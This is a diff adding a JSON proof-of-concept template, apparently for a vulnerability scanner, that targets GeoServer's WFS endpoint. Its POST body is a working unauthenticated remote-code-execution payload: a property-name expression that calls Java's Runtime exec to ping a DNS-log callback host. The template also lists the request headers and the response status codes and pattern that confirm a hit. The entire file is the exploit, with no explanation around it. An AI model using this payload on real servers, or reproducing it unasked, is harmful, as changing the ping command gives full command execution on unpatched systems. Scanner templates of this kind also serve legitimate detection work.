@@ -1,0 +1,21 @@
+{
+	"name":"GeoServer属性名表达式前台代码执行2",
+	"tag":"geoserver",
+	"type":"exec",
+	"poc":{
+		"pocGet":"/geoserver/wfs",
+		"pocPost":"<wfs:GetPropertyValue service='WFS' version='2.0.0'\r\n xmlns:topp='http://www.openplans.org/topp'\r\n xmlns:fes='http://www.opengis.net/fes/2.0'\r\n xmlns:wfs='http://www.opengis.net/wfs/2.0'>\r\n  <wfs:Query typeNames='sf:archsites'/>\r\n  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'ping -nc 1 {{dnslog}}')</wfs:valueReference>\r\n</wfs:GetPropertyValue>",
+		"header":{
+			"Accept":" */*",
+			"Cache-Control":" max-age=0",
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
+			"Connection":" close",
+			"Accept-Encoding":" gzip, deflate, br",
+			"Accept-Language":" en-US;q=0.9,en;q=0.8",
+			"Content-Length":" 356",
+			"Content-Type":" application/xml"
+		},
+		"status_code":"200,400",
+		"pattern":"(xml)"
+	}
+}
